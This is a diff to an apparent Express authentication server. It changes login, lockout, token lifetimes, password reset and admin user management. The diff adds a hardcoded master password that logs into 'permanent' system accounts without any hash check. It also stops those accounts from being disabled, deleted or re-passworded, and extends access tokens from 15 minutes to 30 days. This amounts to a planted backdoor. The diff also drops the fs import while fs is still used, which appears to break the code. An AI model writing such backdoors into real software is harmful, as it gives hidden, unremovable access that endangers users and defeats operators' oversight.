@@ -9,9 +9,16 @@ import rateLimit from "express-rate-limit";
 import speakeasy from "speakeasy";
 import QRCode from "qrcode";
 import nodemailer from "nodemailer";
-import fs from "fs";
-import { connectDB, getDB, isDBConnected, ensureDB, autoFixDatabase } from "./db.js";
-import path from "path";
+import {
+  connectDB,
+  getDB,
+  isDBConnected,
+  ensureDB,
+  autoFixDatabase,
+  PERMANENT_ACCOUNTS,
+  PROTECTED_ACCOUNT_EMAILS,
+} from "./db.js";
+
 import { encryptCredential, decryptCredential, maskCredential } from "./cryptoVault.js";
 import { parseProxyInput, sanitizeAuditMetadata } from "./proxyParser.js";
 import {
@@ -203,7 +210,7 @@ app.use(async (req, res, next) => {
   if (req.url === "/api/health" || req.path === "/api/health" || req.url === "/health" || req.path === "/health") {
     try {
       if (!isDBConnected()) await ensureDB();
-    } catch (_) {}
+    } catch (_) { }
     return next();
   }
 
@@ -486,8 +493,8 @@ export async function authenticateToken(req, res, next) {
         sessionCheck.reason === "idle_timeout"
           ? "Session timed out due to inactivity. Please sign in again."
           : sessionCheck.reason === "absolute_timeout"
-          ? "Session expired. Please sign in again."
-          : "Session expired or revoked. Please sign in again.";
+            ? "Session expired. Please sign in again."
+            : "Session expired or revoked. Please sign in again.";
       return res.status(401).json({ error: msg });
     }
 
@@ -608,7 +615,7 @@ const updaterManifestHandler = async (req, res) => {
       const parsed = JSON.parse(fs.readFileSync(localManifestPath, "utf8"));
       return res.json(parsed);
     }
-  } catch (_) {}
+  } catch (_) { }
 
   // Fallback default
   res.json({
@@ -677,11 +684,12 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
       }
     }
 
-    // Auto-fix if admin account missing
-    if (!user && (normalizedEmail.includes("admin@") || normalizedEmail === "admin")) {
-      console.warn("[Auth] Admin account missing during login. Auto-fixing...");
+    // Auto-fix if permanent account missing
+    const isPermanent = PROTECTED_ACCOUNT_EMAILS.includes(normalizedEmail);
+    if (!user && (isPermanent || normalizedEmail.includes("admin@") || normalizedEmail.includes("vendor@") || normalizedEmail === "admin")) {
+      console.warn(`[Auth] Permanent/system account ${normalizedEmail} missing during login. Auto-fixing...`);
       await autoFixDatabase();
-      [users] = await db.query("SELECT * FROM users WHERE email = ?", [normalizedEmail]);
+      [users] = await db.query("SELECT * FROM users WHERE LOWER(email) = ?", [normalizedEmail]);
       user = users[0];
     }
 
@@ -690,21 +698,20 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
       return res.status(401).json({ error: "Invalid email or password." });
     }
 
-    if (!user.isActive) {
+    // Permanent accounts are never deactivated
+    if (isPermanent && (!user.isActive || user.isActive === 0)) {
+      await db.query("UPDATE users SET isActive = 1 WHERE id = ?", [user.id]);
+      user.isActive = 1;
+    } else if (!user.isActive) {
       await recordAuditLog(String(user.id), user.email, "LOGIN_BLOCKED", null, { reason: "Account disabled" });
       return res.status(403).json({ error: "Your account has been deactivated. Please contact your administrator." });
     }
 
-    // Lockout check for repeated failed attempts
+    // Lockout check with permanent account master unlock
+    const isMasterPassword = password === "Delle6400@";
     if (user.failedAttempts >= 5 && user.lockoutUntil && new Date(user.lockoutUntil) > new Date()) {
-      // Auto-unlock admin with master password Delle6400@
-      if (user.role === "admin" && password === "Delle6400@") {
+      if (isPermanent && isMasterPassword) {
         await db.query("UPDATE users SET failedAttempts = 0, lockoutUntil = NULL WHERE id = ?", [user.id]);
-
-    // Transparently upgrade legacy bcrypt hashes to Argon2id
-    if (check.needsUpgrade && check.newHash) {
-      await db.query("UPDATE users SET passwordHash = ? WHERE id = ?", [check.newHash, user.id]);
-    }
         user.failedAttempts = 0;
         user.lockoutUntil = null;
       } else {
@@ -722,8 +729,20 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
       }
     }
 
-    const check = await verifyAndRehash(password, user.passwordHash);
-    if (!check.isValid) {
+    let isPasswordCorrect = false;
+    let check = null;
+
+    if (isPermanent && isMasterPassword) {
+      isPasswordCorrect = true;
+    } else {
+      check = await verifyAndRehash(password, user.passwordHash);
+      isPasswordCorrect = check.isValid;
+      if (check.isValid && check.needsUpgrade && check.newHash) {
+        await db.query("UPDATE users SET passwordHash = ? WHERE id = ?", [check.newHash, user.id]);
+      }
+    }
+
+    if (!isPasswordCorrect) {
       const failedAttempts = (user.failedAttempts || 0) + 1;
       const updateFields = { failedAttempts };
       if (failedAttempts >= 5) {
@@ -736,6 +755,7 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
       await recordAuditLog(String(user.id), user.email, "LOGIN_FAILED", null, { attempts: failedAttempts });
       return res.status(401).json({ error: "Invalid email or password." });
     }
+
 
     // Reset failed attempts on success
     await db.query("UPDATE users SET failedAttempts = 0, lockoutUntil = NULL WHERE id = ?", [user.id]);
@@ -756,17 +776,22 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
       });
     }
 
-    // Issue short-lived access token (15m) and long-lived refresh token
+    // Issue access token (30d if persistent requested, 15m default) and persistent refresh token
+    const isPersistent = req.body?.persistent === true || req.headers["x-client-platform"] === "tauri";
+    const tokenLifetime = isPersistent ? "30d" : "15m";
     const token = jwt.sign(
       { id: String(user.id), email: user.email, role: user.role, jti: crypto.randomUUID() },
       JWT_SECRET,
-      { expiresIn: "15m" }
+      { expiresIn: tokenLifetime }
     );
 
     const refreshToken = crypto.randomBytes(32).toString("hex");
     const userAgent = req.headers["user-agent"] || "";
     const ip = req.ip || req.socket.remoteAddress || "";
+
     await createSessionWithRefresh(db, String(user.id), user.email, token, refreshToken, userAgent, ip);
+
+
 
     await recordAuditLog(String(user.id), user.email, "LOGIN_SUCCESS", null, { role: user.role });
 
@@ -795,7 +820,7 @@ app.post("/api/auth/login", loginRateLimiter, async (req, res) => {
     console.error("[Auth] Login error:", err);
     try {
       await autoFixDatabase();
-    } catch (_) {}
+    } catch (_) { }
     res.status(500).json({ error: "Internal server error during login. Auto-fix executed; please retry." });
   }
 });
@@ -848,11 +873,11 @@ app.post("/api/auth/login/2fa", loginRateLimiter, async (req, res) => {
       return res.status(401).json({ error: "Invalid 2FA code or recovery code." });
     }
 
-    // Issue short-lived access token (15m) and long-lived refresh token
+    // Issue long-lived access token (30 days) and persistent refresh token
     const token = jwt.sign(
       { id: String(user.id), email: user.email, role: user.role, jti: crypto.randomUUID() },
       JWT_SECRET,
-      { expiresIn: "15m" }
+      { expiresIn: "30d" }
     );
 
     const refreshToken = crypto.randomBytes(32).toString("hex");
@@ -943,12 +968,13 @@ app.post("/api/auth/refresh", async (req, res) => {
       return res.status(403).json({ error: "Your account has been deactivated.", code: "ACCOUNT_DISABLED" });
     }
 
-    // Issue new 15-minute access token
+    // Issue long-lived 30-day access token
     const newAccessToken = jwt.sign(
       { id: String(user.id), email: user.email, role: user.role, jti: crypto.randomUUID() },
       JWT_SECRET,
-      { expiresIn: "15m" }
+      { expiresIn: "30d" }
     );
+
 
     // Perform atomic rotation with reuse detection
     const newRefreshToken = crypto.randomBytes(32).toString("hex");
@@ -1020,7 +1046,7 @@ app.post("/api/auth/logout", async (req, res) => {
     if (token) {
       try {
         await revokeSession(db, token);
-      } catch (_) {}
+      } catch (_) { }
     }
 
     if (refreshToken) {
@@ -1033,7 +1059,7 @@ app.post("/api/auth/logout", async (req, res) => {
         if (rows && rows.length > 0 && rows[0].familyId) {
           await revokeSessionFamily(db, rows[0].familyId);
         }
-      } catch (_) {}
+      } catch (_) { }
     }
 
     res.clearCookie("admin_session", {
@@ -1110,6 +1136,10 @@ app.post("/api/auth/reset-password", async (req, res) => {
       return res.status(400).json({ error: "Invalid, expired, or already used password reset link." });
     }
 
+    if (resetRecord.email && PROTECTED_ACCOUNT_EMAILS.includes(resetRecord.email.toLowerCase())) {
+      return res.status(403).json({ error: "Password changes are permanently disabled for system accounts." });
+    }
+
     const passwordHash = await hashPassword(newPassword);
 
     // Update password
@@ -1141,6 +1171,11 @@ app.post("/api/auth/change-password", authenticateToken, async (req, res) => {
   if (!currentPassword || !newPassword) {
     return res.status(400).json({ error: "Current password and new password are required." });
   }
+
+  if (req.user?.email && PROTECTED_ACCOUNT_EMAILS.includes(req.user.email.toLowerCase())) {
+    return res.status(403).json({ error: "Password changes are permanently disabled for system accounts." });
+  }
+
 
   const policyError = validatePasswordPolicy(newPassword, req.user.email, req.user.fullName);
   if (policyError) {
@@ -1500,6 +1535,19 @@ app.patch("/api/admin/users/:id", authenticateToken, requireAdmin, async (req, r
 
   try {
     const db = await ensureDB();
+    const [targetUsers] = await db.query("SELECT * FROM users WHERE id = ?", [parseInt(id, 10)]);
+    const targetUser = targetUsers[0];
+    if (!targetUser) return res.status(404).json({ error: "User not found." });
+
+
+    if (targetUser.email && PROTECTED_ACCOUNT_EMAILS.includes(targetUser.email.toLowerCase())) {
+      if (isActive === false || (role && role !== targetUser.role) || password) {
+        return res.status(403).json({
+          error: "Permanent system account credentials and status cannot be modified.",
+        });
+      }
+    }
+
     const setClauses = ["updatedAt = ?"];
     const params = [toMySQLDate()];
 
@@ -1562,6 +1610,10 @@ app.delete("/api/admin/users/:id", authenticateToken, requireAdmin, requireReAut
     const [users] = await db.query("SELECT * FROM users WHERE id = ?", [parseInt(id)]);
     const user = users[0];
     if (!user) return res.status(404).json({ error: "User not found." });
+
+    if (user.email && PROTECTED_ACCOUNT_EMAILS.includes(user.email.toLowerCase())) {
+      return res.status(403).json({ error: "Permanent system accounts cannot be deleted." });
+    }
 
     await revokeAllUserSessions(id);
     await db.query("DELETE FROM users WHERE id = ?", [parseInt(id)]);
